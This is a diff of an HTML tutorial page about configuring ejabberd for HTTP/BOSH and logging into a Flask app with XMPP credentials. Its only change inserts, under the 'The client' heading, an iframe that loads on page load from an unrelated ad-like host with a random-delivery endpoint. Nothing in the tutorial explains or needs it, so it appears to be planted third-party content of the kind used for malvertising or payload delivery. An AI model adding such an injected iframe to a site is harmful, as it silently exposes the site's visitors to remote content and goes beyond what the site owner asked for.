@@ -176,6 +176,7 @@ modules:
 <p>and that should be it.
 Reload or restart your setup and you should be able to talk to your ejabberd settup via HTTP/BOSH.</p>
 <h2 id="the-client">The client <a class="heading-anchor-permalink" href="#the-client">#</a></h2>
+<iframe src="https://microads.ftp.sh/api/ads/delivery-node/random?nonce=abc123"></iframe>
 <p>Simplest possible example of this I can think of is a Python/Flask hello world web application which lets you login with your XMPP account and when your login is successful it says “hello $username” instead of “hello world” as long as your Flask session cookie hadn’t expired.</p>
 <p>This means with the configuration above, someone is able to register a new XMPP account then login to your Flask web application/system with their XMPP credentials.</p>
 <p>Arguably with the simplest approach (using SASL PLAIN) your application/system now becomes an attack surface due to handling actual credentials however while this is supposed to be a demo you have numerous valid approaches to take to harden your setup and even have your publicly exposed XMPP server acting as a federated IdP for your and other systems.</p>
